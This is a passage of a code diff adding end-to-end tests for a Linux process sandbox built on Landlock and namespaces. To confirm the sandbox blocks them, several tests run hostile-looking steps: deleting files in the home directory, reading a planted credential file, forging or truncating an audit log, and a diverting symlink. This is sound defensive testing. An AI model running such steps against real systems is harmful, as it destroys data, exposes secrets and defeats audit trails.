@@ -2184,12 +2816,14 @@ class TestLandlockOnlyModeWarning(unittest.TestCase):
 
         with patch("core.sandbox.context.check_mount_available", return_value=False):
             try:
-                with self.assertNoLogs("core.sandbox.context", level="WARNING"):
-                    with TemporaryDirectory() as d:
-                        sandbox_run(
-                            ["true"], target=d, output=d,
-                            capture_output=True, text=True, timeout=5,
-                        )
+                with (
+                    self.assertNoLogs("core.sandbox.context", level="WARNING"),
+                    TemporaryDirectory() as d,
+                ):
+                    sandbox_run(
+                        ["true"], target=d, output=d,
+                        capture_output=True, text=True, timeout=5,
+                    )
             finally:
                 # Reset the flag so other tests in the same process
                 # aren't affected by the manual override above.
@@ -2233,8 +2867,8 @@ class TestE2EObserveMode(unittest.TestCase):
     def setUp(self):
         if not check_net_available():
             self.skipTest("User namespaces not available")
-        from core.sandbox.seccomp import check_seccomp_available
         from core.sandbox.ptrace_probe import check_ptrace_available
+        from core.sandbox.seccomp import check_seccomp_available
         if not check_seccomp_available():
             self.skipTest("libseccomp unavailable")
         if not check_ptrace_available():
@@ -2242,7 +2876,8 @@ class TestE2EObserveMode(unittest.TestCase):
 
     def test_observe_run_produces_parseable_profile(self):
         from core.sandbox.observe_profile import (
-            OBSERVE_FILENAME, parse_observe_log,
+            OBSERVE_FILENAME,
+            parse_observe_log,
         )
 
         with TemporaryDirectory() as d:
@@ -2259,8 +2894,11 @@ class TestE2EObserveMode(unittest.TestCase):
             self.assertEqual(result.returncode, 0,
                              f"true should exit 0; stderr={result.stderr!r}")
 
-            observe_log = run_dir / OBSERVE_FILENAME
-            denials_log = run_dir / ".sandbox-denials.jsonl"
+            from core.sandbox.evidence import resolve_read_path
+            observe_log = resolve_read_path(run_dir, OBSERVE_FILENAME)
+            denials_log = resolve_read_path(
+                run_dir, ".sandbox-denials.jsonl",
+            )
 
             if not observe_log.exists():
                 self.skipTest(
@@ -2292,5 +2930,855 @@ class TestE2EObserveMode(unittest.TestCase):
             )
 
 
+class TestE2ELandlockIoctlDev(unittest.TestCase):
+    """ABI v5+: IOCTL_DEV blocks device ioctl in sandboxed processes."""
+
+    def setUp(self):
+        if not check_net_available():
+            self.skipTest("User namespaces not available")
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+        from core.sandbox.landlock import _get_landlock_abi
+        if _get_landlock_abi() < 5:
+            self.skipTest("Landlock ABI < 5 — IOCTL_DEV not available")
+
+    def test_ioctl_on_dev_null_blocked(self):
+        import shutil
+        if not shutil.which("gcc"):
+            self.skipTest("gcc not installed")
+        with TemporaryDirectory() as d:
+            src = Path(d) / "ioctldev.c"
+            src.write_text(
+                "#include <stdio.h>\n"
+                "#include <fcntl.h>\n"
+                "#include <unistd.h>\n"
+                "#include <errno.h>\n"
+                "#include <sys/ioctl.h>\n"
+                "int main(void){\n"
+                "  int fd=open(\"/dev/null\",O_RDWR);\n"
+                "  if(fd<0){printf(\"open_err=%d\\n\",errno);return 1;}\n"
+                "  int r=ioctl(fd,TCGETS,0);\n"
+                "  printf(\"rc=%d errno=%d\\n\",r,errno);\n"
+                "  close(fd);\n"
+                "  return 0;\n"
+                "}\n"
+            )
+            bin_path = Path(d) / "ioctldev"
+            compile_result = sandbox_run(
+                ["gcc", "-O0", str(src), "-o", str(bin_path)],
+                block_network=True, target=d, output=d,
+                capture_output=True, text=True, timeout=15,
+            )
+            if compile_result.returncode != 0:
+                self.skipTest(f"gcc failed: {compile_result.stderr[:200]}")
+            result = sandbox_run(
+                [str(bin_path)],
+                block_network=True, target=d, output=d,
+                capture_output=True, text=True, timeout=5,
+            )
+            # EACCES (13) from Landlock, not ENOTTY (25) which is the
+            # normal /dev/null response without Landlock IOCTL_DEV.
+            self.assertIn("errno=13", result.stdout,
+                          f"ioctl on /dev/null should be blocked by "
+                          f"Landlock IOCTL_DEV (EACCES); got: {result.stdout!r}")
+
+
+class TestE2ELandlockSignalScope(unittest.TestCase):
+    """ABI v6+: signal scoping blocks cross-domain signal delivery.
+
+    Can't test via the sandbox wrapper's PID namespace (parent PID is
+    invisible → ESRCH, not EPERM). Instead, compile a C program that
+    forks, applies Landlock scoping in the child only, and has the
+    child try to signal the (unscoped) parent. The child gets EPERM
+    from Landlock, not ESRCH from PID namespace.
+    """
+
+    def setUp(self):
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+        from core.sandbox.landlock import _get_landlock_abi
+        if _get_landlock_abi() < 6:
+            self.skipTest("Landlock ABI < 6 — signal scoping not available")
+        import shutil
+        if not shutil.which("gcc"):
+            self.skipTest("gcc not installed")
+
+    _SIGNAL_SCOPE_SRC = (
+        "#include <stdio.h>\n"
+        "#include <stdlib.h>\n"
+        "#include <unistd.h>\n"
+        "#include <signal.h>\n"
+        "#include <errno.h>\n"
+        "#include <sys/prctl.h>\n"
+        "#include <sys/syscall.h>\n"
+        "#include <sys/wait.h>\n"
+        "#include <string.h>\n"
+        "\n"
+        "struct landlock_ruleset_attr {\n"
+        "  unsigned long long handled_access_fs;\n"
+        "  unsigned long long handled_access_net;\n"
+        "  unsigned long long scoped;\n"
+        "};\n"
+        "\n"
+        "#define LANDLOCK_SCOPE_SIGNAL (1ULL << 1)\n"
+        "\n"
+        "int main(void) {\n"
+        "  pid_t parent = getpid();\n"
+        "  pid_t child = fork();\n"
+        "  if (child < 0) { perror(\"fork\"); return 1; }\n"
+        "  if (child > 0) {\n"
+        "    int status; waitpid(child, &status, 0);\n"
+        "    if (WIFEXITED(status)) return WEXITSTATUS(status);\n"
+        "    return 1;\n"
+        "  }\n"
+        "  /* child: apply Landlock with signal scoping */\n"
+        "  struct landlock_ruleset_attr attr = {0, 0, LANDLOCK_SCOPE_SIGNAL};\n"
+        "  int fd = syscall(444, &attr, sizeof(attr), 0);\n"
+        "  if (fd < 0) { printf(\"create_err=%d\\n\", errno); return 2; }\n"
+        "  prctl(38, 1, 0, 0, 0);\n"
+        "  long r = syscall(446, fd, 0);\n"
+        "  close(fd);\n"
+        "  if (r < 0) { printf(\"restrict_err=%d\\n\", errno); return 2; }\n"
+        "  /* self-signal: must succeed (same domain) */\n"
+        "  if (kill(getpid(), 0) != 0) {\n"
+        "    printf(\"self_errno=%d\\n\", errno); return 3;\n"
+        "  }\n"
+        "  /* cross-domain signal to parent: must fail with EPERM */\n"
+        "  int ret = kill(parent, 0);\n"
+        "  printf(\"cross_rc=%d cross_errno=%d\\n\", ret, errno);\n"
+        "  return (ret == -1 && errno == 1) ? 0 : 4;\n"
+        "}\n"
+    )
+
+    def test_cross_domain_signal_blocked(self):
+        """Child in a scoped Landlock domain cannot signal the parent."""
+        with TemporaryDirectory() as d:
+            src = Path(d) / "sigscope.c"
+            src.write_text(self._SIGNAL_SCOPE_SRC)
+            bin_path = Path(d) / "sigscope"
+            cr = subprocess.run(
+                ["gcc", "-O0", str(src), "-o", str(bin_path)],
+                capture_output=True, text=True, timeout=15, check=False,
+            )
+            if cr.returncode != 0:
+                self.skipTest(f"gcc failed: {cr.stderr[:200]}")
+            result = subprocess.run(
+                [str(bin_path)],
+                capture_output=True, text=True, timeout=10, check=False,
+            )
+            self.assertEqual(
+                result.returncode, 0,
+                f"signal scoping test failed (rc={result.returncode}); "
+                f"stdout: {result.stdout!r} stderr: {result.stderr!r}",
+            )
+            self.assertIn("cross_errno=1", result.stdout)
+
+
+class TestDegradedModeTcpDeny(unittest.TestCase):
+    """Landlock TCP-connect deny when block_network has no namespace.
+
+    Emulates a degraded host (Ubuntu 24.04 AppArmor-userns default,
+    SELinux, nested containers) by patching check_net_available to
+    False. block_network=True must then fall back to a handled-but-
+    empty Landlock net ruleset: every TCP connect fails with EACCES
+    (loopback included), bind/listen stays permitted, and known
+    daemon-IPC tools get env-nudged to no-daemon mode.
+    """
+
+    def setUp(self):
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+        from core.sandbox.landlock import _get_landlock_abi
+        if _get_landlock_abi() < 4:
+            self.skipTest("Landlock ABI < 4 (no TCP rules)")
+
+    @staticmethod
+    def _listener():
+        import socket
+        s = socket.socket()
+        s.bind(("127.0.0.1", 0))
+        s.listen(1)
+        return s
+
+    @staticmethod
+    def _connect_cmd(port):
+        return ["python3", "-c",
+                (f"import socket; s = socket.socket(); s.settimeout(5); "
+                 f"s.connect(('127.0.0.1', {port})); print('connected')")]
+
+    def test_deny_blocks_tcp_connect(self):
+        """Loopback connect denied — with and without an fs ruleset."""
+        from unittest.mock import patch
+        srv = self._listener()
+        port = srv.getsockname()[1]
+        try:
+            with patch("core.sandbox.context.check_net_available",
+                       return_value=False):
+                # Net-only ruleset (no target/output → no fs handling).
+                r = sandbox_run(
+                    self._connect_cmd(port), block_network=True,
+                    allow_path_divergence=True,
+                    capture_output=True, text=True, timeout=15,
+                )
+                self.assertNotEqual(r.returncode, 0,
+                                    "TCP connect should be denied")
+                self.assertIn("PermissionError", r.stderr)
+                self.assertTrue(r.sandbox_info.get("degraded_net_deny"))
+                # Combined ruleset (output engages the fs mask too).
+                with TemporaryDirectory() as d:
+                    r2 = sandbox_run(
+                        self._connect_cmd(port), block_network=True,
+                        allow_path_divergence=True,
+                        output=d,
+                        capture_output=True, text=True, timeout=15,
+                    )
+                    self.assertNotEqual(r2.returncode, 0)
+                    self.assertIn("PermissionError", r2.stderr)
+        finally:
+            srv.close()
+
+    def test_optout_allows_connect_and_bind_still_works(self):
+        """degraded_net_deny=False restores pre-fix behaviour; bind is
+        never restricted under the deny either."""
+        from unittest.mock import patch
+        srv = self._listener()
+        port = srv.getsockname()[1]
+        try:
+            with patch("core.sandbox.context.check_net_available",
+                       return_value=False):
+                r = sandbox_run(
+                    self._connect_cmd(port), block_network=True,
+                    allow_path_divergence=True,
+                    degraded_net_deny=False,
+                    capture_output=True, text=True, timeout=15,
+                )
+                self.assertEqual(
+                    r.returncode, 0,
+                    f"opt-out should allow connect; stderr={r.stderr!r}")
+                self.assertNotIn("degraded_net_deny", r.sandbox_info)
+                # bind/listen under the deny (design constraint: tools
+                # may bind even when unreachable).
+                r2 = sandbox_run(
+                    ["python3", "-c",
+                     ("import socket; b = socket.socket(); "
+                      "b.bind(('127.0.0.1', 0)); b.listen(1); print('bound')")],
+                    block_network=True, allow_path_divergence=True,
+                    capture_output=True, text=True, timeout=15,
+                )
+                self.assertEqual(r2.returncode, 0,
+                                 f"bind must stay permitted; stderr={r2.stderr!r}")
+        finally:
+            srv.close()
+
+    def test_daemon_env_nudge(self):
+        """GRADLE_OPTS / NX_DAEMON nudges injected only under the deny."""
+        from unittest.mock import patch
+        with patch("core.sandbox.context.check_net_available",
+                   return_value=False):
+            r = sandbox_run(["env"], block_network=True,
+                            capture_output=True, text=True, timeout=15)
+        self.assertEqual(r.returncode, 0)
+        self.assertIn("-Dorg.gradle.daemon=false", r.stdout)
+        self.assertIn("NX_DAEMON=false", r.stdout)
+        # Healthy path: no nudge.
+        if check_net_available():
+            r2 = sandbox_run(["env"], block_network=True,
+                             capture_output=True, text=True, timeout=15)
+            self.assertNotIn("org.gradle.daemon", r2.stdout)
+
+    def test_caller_allowlist_wins_over_deny(self):
+        """allowed_tcp_ports is already the network policy — the
+        degraded deny must not override it."""
+        from unittest.mock import patch
+        with patch("core.sandbox.context.check_net_available",
+                   return_value=False), TemporaryDirectory() as d:
+            r = sandbox_run(["true"], block_network=False,
+                            allowed_tcp_ports=[443], output=d,
+                            capture_output=True, text=True, timeout=15)
+        self.assertEqual(r.returncode, 0)
+        self.assertNotIn("degraded_net_deny", r.sandbox_info)
+
+    def test_per_call_override_rejected(self):
+        """degraded_net_deny is context-level; per-call must TypeError."""
+        with sandbox(block_network=True) as run_fn, \
+                self.assertRaises(TypeError):
+            run_fn(["true"], degraded_net_deny=False)
+
+
+class TestE2EDeletionRestriction(unittest.TestCase):
+    """REMOVE_FILE/REMOVE_DIR handled: deletion follows write policy.
+
+    Landlock's handled-access model means any bit not in
+    handled_access_fs is unrestricted — before REMOVE_* was handled, a
+    sandboxed child could unlink/rmdir anything the user's DAC
+    permitted while being unable to modify the same files. Deletion
+    must now be denied outside writable paths and permitted inside.
+    """
+
+    def setUp(self):
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+
+    def test_unlink_outside_writable_denied(self):
+        """Two layers can stop the delete: mount-ns leaves $HOME out of
+        the bind tree entirely (rm -f sees ENOENT and exits 0), and
+        Landlock denies REMOVE_FILE (EACCES, rm exits non-zero). Either
+        way the victim must survive; the skip_mount_ns variant below
+        pins the Landlock layer specifically."""
+        victim = Path.home() / ".raptor_remove_test_victim.txt"
+        victim.write_text("do-not-delete\n")
+        try:
+            with TemporaryDirectory() as out:
+                r = sandbox_run(
+                    ["rm", "-f", str(victim)],
+                    target=out, output=out,
+                    capture_output=True, text=True, timeout=10,
+                )
+                self.assertTrue(victim.exists(),
+                                "victim file was deleted through the sandbox"
+                                f" (rc={r.returncode})")
+        finally:
+            try:
+                victim.unlink()
+            except OSError:
+                pass
+
+    def test_unlink_outside_denied_by_landlock(self):
+        """skip_mount_ns leaves the host fs visible — only Landlock's
+        handled REMOVE_FILE stands between the child and the unlink."""
+        victim = Path.home() / ".raptor_remove_test_victim2.txt"
+        victim.write_text("do-not-delete\n")
+        try:
+            with TemporaryDirectory() as out:
+                r = sandbox_run(
+                    ["rm", "-f", str(victim)],
+                    target=out, output=out,
+                    skip_mount_ns=True,
+                    capture_output=True, text=True, timeout=10,
+                )
+                self.assertNotEqual(r.returncode, 0,
+                                    "Landlock must deny the unlink")
+                self.assertIn("Permission denied", r.stderr)
+                self.assertTrue(victim.exists())
+        finally:
+            try:
+                victim.unlink()
+            except OSError:
+                pass
+
+    def test_rmdir_outside_writable_denied(self):
+        victim_dir = Path.home() / ".raptor_remove_test_dir"
+        victim_dir.mkdir(exist_ok=True)
+        try:
+            with TemporaryDirectory() as out:
+                r = sandbox_run(
+                    ["rmdir", str(victim_dir)],
+                    target=out, output=out,
+                    capture_output=True, text=True, timeout=10,
+                )
+                self.assertNotEqual(r.returncode, 0)
+                self.assertTrue(victim_dir.is_dir(),
+                                "victim dir was removed through the sandbox")
+        finally:
+            try:
+                victim_dir.rmdir()
+            except OSError:
+                pass
+
+    def test_delete_inside_writable_allowed(self):
+        """Deletion inside output/ and /tmp keeps working — make clean,
+        cargo clean, tempfile churn all rely on it."""
+        with TemporaryDirectory() as out:
+            inner = Path(out) / "sub"
+            inner.mkdir()
+            (inner / "f.txt").write_text("x")
+            r = sandbox_run(
+                ["bash", "-c",
+                 f"rm {inner}/f.txt && rmdir {inner} && echo DEL-OK"],
+                target=out, output=out,
+                capture_output=True, text=True, timeout=10,
+            )
+            self.assertEqual(r.returncode, 0, r.stderr[-200:])
+            self.assertIn("DEL-OK", r.stdout)
+
+
+class TestStrictProfileDefaults(unittest.TestCase):
+    """strict defaults restrict_reads=True (+ fake_home with output=).
+
+    An operator choosing fail-closed semantics has accepted
+    compatibility risk for guarantees; read-everywhere leaves $HOME
+    credentials exposed in Landlock-only mode. Explicit kwargs must
+    still override the profile defaults.
+    """
+
+    def setUp(self):
+        if not check_net_available():
+            self.skipTest("User namespaces not available")
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+
+    def test_strict_implies_restrict_reads_and_fake_home(self):
+        secret = Path.home() / ".raptor_strict_secret.txt"
+        secret.write_text("SECRET-CREDENTIAL\n")
+        try:
+            with TemporaryDirectory() as out:
+                r = sandbox_run(
+                    ["bash", "-c",
+                     (f"cat {secret} 2>/dev/null && echo HOME-READ-OK; "
+                      "echo HOME=$HOME")],
+                    profile="strict", target=out, output=out,
+                    capture_output=True, text=True, timeout=15,
+                )
+                self.assertTrue(r.sandbox_info.get("restrict_reads"),
+                                "strict must default restrict_reads=True")
+                self.assertNotIn("SECRET-CREDENTIAL", r.stdout)
+                self.assertNotIn("HOME-READ-OK", r.stdout)
+                # fake_home engaged: HOME points into {output}/.home
+                self.assertIn("/.home", r.stdout,
+                              f"fake HOME expected; stdout={r.stdout!r}")
+        finally:
+            try:
+                secret.unlink()
+            except OSError:
+                pass
+
+    def test_explicit_kwargs_override_strict_defaults(self):
+        with TemporaryDirectory() as out:
+            r = sandbox_run(
+                ["true"], profile="strict", target=out, output=out,
+                restrict_reads=False, fake_home=False,
+                capture_output=True, text=True, timeout=15,
+            )
+            self.assertEqual(r.returncode, 0)
+            self.assertFalse(r.sandbox_info.get("restrict_reads"),
+                             "explicit restrict_reads=False must win")
+
+    def test_strict_without_output_skips_fake_home(self):
+        """fake_home needs output=; strict with target-only must not
+        raise the fake_home-requires-output ValueError."""
+        with TemporaryDirectory() as tgt:
+            r = sandbox_run(
+                ["true"], profile="strict", target=tgt,
+                capture_output=True, text=True, timeout=15,
+            )
+            self.assertEqual(r.returncode, 0)
+            self.assertTrue(r.sandbox_info.get("restrict_reads"))
+
+    def test_full_profile_defaults_unchanged(self):
+        with TemporaryDirectory() as out:
+            r = sandbox_run(
+                ["true"], profile="full", target=out, output=out,
+                capture_output=True, text=True, timeout=15,
+            )
+            self.assertEqual(r.returncode, 0)
+            self.assertFalse(r.sandbox_info.get("restrict_reads"),
+                             "full must stay read-everywhere by default")
+
+
+class TestNetnsLoopbackUp(unittest.TestCase):
+    """The fresh netns must have a WORKING isolated loopback.
+
+    A new netns has lo DOWN — bind() works but self-connect fails
+    ENETUNREACH, which silently broke every loopback-IPC tool (gradle
+    daemon, language servers, self-connecting test suites) under
+    block_network until 2026-08-15. The spawn path brings lo up right
+    after unshare (in-process, capabilities intact). External
+    reachability must stay at zero — the namespace has no other
+    interfaces and no routes out.
+    """
+
+    def setUp(self):
+        if not check_net_available():
+            self.skipTest("User namespaces not available")
+
+    def test_self_loopback_works_external_blocked(self):
+        code = (
+            "import socket, threading, errno\n"
+            "b = socket.socket(); b.bind(('127.0.0.1', 0)); b.listen(1)\n"
+            "threading.Thread(target=lambda: b.accept(), daemon=True).start()\n"
+            "c = socket.socket(); c.settimeout(5)\n"
+            "try:\n"
+            "    c.connect(b.getsockname()); print('SELF-CONNECT-OK')\n"
+            "except OSError as e:\n"
+            "    print('SELF-CONNECT-FAIL', errno.errorcode.get(e.errno, e.errno))\n"
+            "u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+            "try:\n"
+            "    u.sendto(b'x', ('127.0.0.1', 9)); print('UDP-LOOPBACK-OK')\n"
+            "except OSError as e:\n"
+            "    print('UDP-LOOPBACK-FAIL', errno.errorcode.get(e.errno, e.errno))\n"
+            "x = socket.socket(); x.settimeout(3)\n"
+            "try:\n"
+            "    x.connect(('192.0.2.1', 80)); print('EXTERNAL-REACHABLE')\n"
+            "except OSError:\n"
+            "    print('EXTERNAL-BLOCKED')\n"
+        )
+        with TemporaryDirectory() as out:
+            # /usr/bin/python3 explicitly: a $PATH interpreter outside
+            # the mount tree would route through the mountless retry;
+            # keep this test pinned on the mount lane's unconditional
+            # loopback bringup.
+            r = sandbox_run(
+                ["/usr/bin/python3", "-c", code],
+                block_network=True, target=out, output=out,
+                capture_output=True, text=True, timeout=30,
+            )
+            self.assertEqual(r.returncode, 0, r.stderr[-300:])
+            self.assertIn("SELF-CONNECT-OK", r.stdout,
+                          f"loopback TCP must work inside the netns: "
+                          f"{r.stdout!r}")
+            self.assertIn("UDP-LOOPBACK-OK", r.stdout)
+            self.assertIn("EXTERNAL-BLOCKED", r.stdout,
+                          "external network must stay unreachable")
+
+
+# The tamper script both backends run. Attempts every mutation from
+# the evidence-placement design's tamper matrix against the evidence
+# JSONL and reports each outcome as OP=RESULT lines on stdout. The
+# parent asserts on the on-disk state (authoritative) AND on the
+# reported outcomes (diagnostic).
+_EVIDENCE_TAMPER_SCRIPT = r"""
+import json, os, sys
+evdir = sys.argv[1]
+jsonl = os.path.join(evdir, ".sandbox-denials.jsonl")
+def attempt(name, fn):
+    try:
+        fn()
+        print(f"{name}=OK")
+    except OSError as e:
+        print(f"{name}=ERR:{e.errno}")
+def _append():
+    fd = os.open(jsonl, os.O_WRONLY | os.O_APPEND)
+    try:
+        os.write(fd, b'{"forged": true}\n')
+    finally:
+        os.close(fd)
+def _truncate():
+    fd = os.open(jsonl, os.O_WRONLY | os.O_TRUNC)
+    os.close(fd)
+def _unlink():
+    os.unlink(jsonl)
+def _precreate():
+    fd = os.open(os.path.join(evdir, "planted.jsonl"),
+                 os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+    os.close(fd)
+def _read():
+    with open(jsonl, "rb") as f:
+        data = f.read()
+    print(f"READ-BYTES={len(data)}")
+    sys.stdout.write("READ-CONTENT:" + data.decode(errors="replace"))
+attempt("APPEND", _append)
+attempt("TRUNCATE", _truncate)
+attempt("UNLINK", _unlink)
+attempt("PRECREATE", _precreate)
+attempt("READ", _read)
+"""
+
+
+class TestE2EEvidenceTamperResistanceMountNs(unittest.TestCase):
+    """Evidence-placement tamper matrix, mount-ns backend: the
+    ``<run_dir>/.audit`` directory is shadowed by an empty read-only
+    tmpfs inside the child's mount view, so append / truncate /
+    unlink / pre-create attempts against the evidence JSONL cannot
+    reach (or even see) the real file the parent-side writers hold
+    open."""
+
+    def setUp(self):
+        if not check_net_available():
+            self.skipTest("User namespaces not available")
+        from core.sandbox._spawn import mount_ns_available
+        if not mount_ns_available():
+            self.skipTest("mount-ns not available on this host")
+
+    def test_child_cannot_touch_or_see_evidence(self):
+        from core.sandbox.evidence import EvidenceFile
+
+        with TemporaryDirectory() as d:
+            # Parent-side evidence file with a seeded record, exactly
+            # as the spawn layer creates it at sandbox start.
+            seed = {"seeded": "raptor-evidence-sentinel-1f2e3d"}
+            ev_file = EvidenceFile.open(d, ".sandbox-denials.jsonl")
+            try:
+                ev_file.write_record(seed)
+
+                r = sandbox_run(
+                    ["/usr/bin/python3", "-B", "-c",
+                     _EVIDENCE_TAMPER_SCRIPT, f"{d}/.audit"],
+                    block_network=True, target=d, output=d,
+                    capture_output=True, text=True, timeout=30,
+                )
+                if not (getattr(r, "sandbox_info", None) or {}).get(
+                        "mount_ns_active"):
+                    self.skipTest(
+                        "run fell back below mount-ns; the shadow-"
+                        "tmpfs exclusion is not in effect on this host"
+                    )
+                self.assertEqual(r.returncode, 0, r.stderr[-300:])
+
+                # No mutation may report success.
+                for op in ("APPEND", "TRUNCATE", "UNLINK",
+                           "PRECREATE"):
+                    self.assertNotIn(f"{op}=OK", r.stdout, (
+                        f"{op} succeeded from inside the sandbox: "
+                        f"{r.stdout!r}"
+                    ))
+                # The child must not be able to READ the evidence
+                # either — its view of .audit is an empty decoy.
+                self.assertNotIn("raptor-evidence-sentinel-1f2e3d",
+                                 r.stdout)
+
+                # Authoritative on-disk state: the seeded record is
+                # intact, nothing forged, nothing planted, and the
+                # inode verification is clean.
+                self.assertTrue(ev_file.close(),
+                                "inode verification failed")
+                lines = ev_file.path.read_text().splitlines()
+                self.assertEqual(len(lines), 1)
+                self.assertEqual(
+                    __import__("json").loads(lines[0]), seed)
+                self.assertEqual(
+                    sorted(p.name for p in ev_file.path.parent.iterdir()),
+                    [".sandbox-denials.jsonl"],
+                    "child planted a file into the evidence dir",
+                )
+            finally:
+                ev_file.close(verify=False)
+
+
+class TestE2EEvidenceShadowSymlinkRefused(unittest.TestCase):
+    """A hostile target tree shipping ``.audit`` as a relative symlink
+    must not steer the evidence-shadow tmpfs onto another in-root
+    directory (interpreter-hiding posture-downgrade lever): the shadow
+    is refused with a warning and the run proceeds unharmed."""
+
+    def setUp(self):
+        if not check_net_available():
+            self.skipTest("User namespaces not available")
+        from core.sandbox._spawn import mount_ns_available
+        if not mount_ns_available():
+            self.skipTest("mount-ns not available on this host")
+
+    def test_symlinked_audit_dir_does_not_divert_shadow_mount(self):
+        with TemporaryDirectory() as tgt, TemporaryDirectory() as out:
+            # relative symlink that would resolve to {root}/usr from
+            # a /tmp-resident target bind inside the staged tree
+            os.symlink("../../usr", os.path.join(tgt, ".audit"))
+            r = sandbox_run(
+                ["/usr/bin/python3", "-B", "-c", "print('ALIVE')"],
+                block_network=True, target=tgt, output=out,
+                capture_output=True, text=True, timeout=30,
+            )
+            if not (getattr(r, "sandbox_info", None) or {}).get(
+                    "mount_ns_active"):
+                self.skipTest("run fell back below mount-ns")
+            self.assertEqual(r.returncode, 0, (
+                f"hostile .audit symlink broke the run (shadow mount "
+                f"steered): rc={r.returncode} stderr={r.stderr[-300:]!r}"
+            ))
+            self.assertIn("ALIVE", r.stdout)
+            self.assertIn("refusing evidence-dir shadow", r.stderr,
+                          "expected the loud symlink refusal warning")
+
+
+class TestE2EEvidenceTamperResistanceLandlockOnly(unittest.TestCase):
+    """Evidence-placement tamper matrix, Landlock-only backend: when
+    the evidence dir is not beneath any writable grant, Landlock
+    denies append / truncate / pre-create (WRITE/TRUNCATE/MAKE_REG)
+    and — with the REMOVE mask handled — deletion of the JSONL too.
+
+    Note the honest scope limit: Landlock allow-rules are subtree-
+    recursive with no subtraction, so when ``audit_run_dir`` equals a
+    granted writable dir (run_dir == output on this backend) the
+    exclusion cannot be expressed and the held-fd + inode-
+    verification detection layer is the remaining defence. This test
+    pins the enforced configuration (evidence dir outside the
+    writable grants)."""
+
+    def setUp(self):
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+
+    def test_child_denied_all_mutations_including_remove(self):
+        import errno
+        import subprocess as sp
+
+        from core.sandbox.evidence import EvidenceFile
+        from core.sandbox.landlock import _make_landlock_preexec
+
+        with TemporaryDirectory() as d:
+            base = Path(d)
+            out = base / "out"          # the child's writable grant
+            out.mkdir()
+            run_dir = base / "run"      # evidence home — NOT granted
+            run_dir.mkdir()
+
+            seed = {"seeded": "landlock-evidence-sentinel-9a8b7c"}
+            ev_file = EvidenceFile.open(run_dir, ".sandbox-denials.jsonl")
+            try:
+                ev_file.write_record(seed)
+
+                preexec = _make_landlock_preexec([str(out)], None)
+                r = sp.run(
+                    ["/usr/bin/python3", "-B", "-c",
+                     _EVIDENCE_TAMPER_SCRIPT,
+                     str(run_dir / ".audit")],
+                    preexec_fn=preexec,
+                    capture_output=True, text=True, timeout=30,
+                    check=False,
+                )
+                self.assertEqual(r.returncode, 0, r.stderr[-300:])
+
+                # Every mutation must be EACCES'd by Landlock —
+                # including UNLINK, which is only denied because the
+                # REMOVE mask is handled by the ruleset.
+                for op in ("APPEND", "TRUNCATE", "UNLINK",
+                           "PRECREATE"):
+                    self.assertIn(f"{op}=ERR:{errno.EACCES}",
+                                  r.stdout, (
+                        f"{op} was not denied by Landlock: "
+                        f"{r.stdout!r}"
+                    ))
+
+                # On-disk state intact + inode verification clean.
+                self.assertTrue(ev_file.close(),
+                                "inode verification failed")
+                lines = ev_file.path.read_text().splitlines()
+                self.assertEqual(len(lines), 1)
+                self.assertEqual(
+                    sorted(p.name for p in ev_file.path.parent.iterdir()),
+                    [".sandbox-denials.jsonl"],
+                )
+            finally:
+                ev_file.close(verify=False)
+
+    def test_sandbox_write_into_own_output_still_works(self):
+        # Control: the same preexec still allows writes inside the
+        # granted dir — proves the denials above come from the
+        # evidence-dir exclusion, not a broken ruleset.
+        import subprocess as sp
+
+        from core.sandbox.landlock import _make_landlock_preexec
+
+        with TemporaryDirectory() as d:
+            out = Path(d) / "out"
+            out.mkdir()
+            preexec = _make_landlock_preexec([str(out)], None)
+            r = sp.run(
+                ["/usr/bin/python3", "-B", "-c",
+                 "import sys; open(sys.argv[1], 'w').write('ok')",
+                 str(out / "artifact.txt")],
+                preexec_fn=preexec,
+                capture_output=True, text=True, timeout=30,
+                check=False,
+            )
+            self.assertEqual(r.returncode, 0, r.stderr[-300:])
+            self.assertEqual((out / "artifact.txt").read_text(), "ok")
+
+
+class TestE2ENonceNotDiscoverable(unittest.TestCase):
+    """F31: the observe nonce travels to the tracer through an
+    anonymous fd. On the namespace-less Landlock-only audit path —
+    where /tmp is shared with the target — no ``raptor-audit-cfg-*``
+    file may exist for the target to glob, and the nonce must land
+    only in the ``.audit/`` JSONL the target cannot write."""
+
+    def setUp(self):
+        if not check_landlock_available():
+            self.skipTest("Landlock not available")
+        from core.sandbox.ptrace_probe import check_ptrace_available
+        from core.sandbox.seccomp import check_seccomp_available
+        if not check_seccomp_available():
+            self.skipTest("libseccomp unavailable")
+        if not check_ptrace_available():
+            self.skipTest("ptrace blocked (Yama scope, cap-drop)")
+
+    def test_no_config_file_visible_to_target_during_run(self):
+        import secrets
+
+        from core.sandbox._landlock_audit import run_landlock_audit
+        from core.sandbox.evidence import evidence_write_path
+
+        nonce = secrets.token_hex(16)
+        probe = (
+            "import glob, tempfile;"
+            "hits = glob.glob(tempfile.gettempdir()"
+            " + '/raptor-audit-cfg-*');"
+            "print('CFG-HITS:' + repr(hits))"
+        )
+        with TemporaryDirectory() as d:
+            run_dir = Path(d) / "run"
+            run_dir.mkdir()
+            r = run_landlock_audit(
+                ["/usr/bin/python3", "-B", "-c", probe],
+                audit_run_dir=str(run_dir),
+                audit_verbose=True,
+                observe_mode=True,
+                observe_nonce=nonce,
+                writable_paths=[d],
+                timeout=30,
+            )
+            self.assertEqual(r.returncode, 0, r.stderr[-300:])
+            # The target found no on-disk config to read the nonce
+            # from — the fd-based delivery leaves no /tmp footprint.
+            self.assertIn("CFG-HITS:[]", r.stdout)
+            self.assertNotIn(nonce, r.stdout)
+            # The nonce DID reach the tracer: the end-of-run summary
+            # record in the .audit/ JSONL carries it.
+            jsonl = evidence_write_path(
+                run_dir, ".sandbox-observe.jsonl")
+            self.assertTrue(jsonl.exists(),
+                            "observe JSONL missing from .audit/")
+            self.assertIn(nonce, jsonl.read_text())
+
+
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestCliReadablePathExtension(unittest.TestCase):
+    """--sandbox-readable-path end-to-end: a read that restrict_reads
+    denies (home dir — not on the default allowlist, not bind-mounted
+    in mount-ns mode) succeeds once the operator extends the allowlist
